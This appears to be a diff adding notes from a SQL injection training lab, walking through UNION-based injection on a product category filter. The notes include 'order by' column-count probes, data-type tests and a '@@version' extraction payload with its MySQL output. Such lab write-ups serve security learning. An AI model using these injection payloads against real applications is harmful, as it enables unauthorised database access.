@@ -1,0 +1,45 @@
+SQL Injection Attack: Query the database type and version on MYSQL and Microsoft
+SLQ Injection Location: Product category filter
+
+End Goal: Display database version string
+
+--------------
+ANALYSIS
+--------------
+
+As usual, you can quickly confirm the vulnerability using the SQLi character '
+
+1. Find the number of columns that the vulnerable query is using
+
+' order by 1--
+' order by 2--
+' order by 3--
+
+You can also test with a different comment character since different SQL interpreters comments out differently
+
+' order by 1#   :: Response code 200 => Colum exists
+' order by 2#   :: Response code 200 => Colum exists
+' order by 3#   :: Internal Server Error => Colum doesn't exist
+
+There are 2 columns that the query is using
+
+2. Determine the data types of the above columns
+
+' UNION select 'a', NULL#   :: Column accepts text/string
+' UNION select NULL, "a"#   :: Column accepts text/string
+' UNION select 'a', 'a'#    :: Both accepts text/string
+
+3. Output the database version
+
+From the cheatsheet, to output database vesrion for MYSQL & Microsoft (MSSQL):
+
+Microsoft:  SELECT @@version 
+MYSQL:      SELECT @@version
+
+Formulating the query:
+
+' UNION select @@version, NULL#
+
+We get:
+
+8.0.25
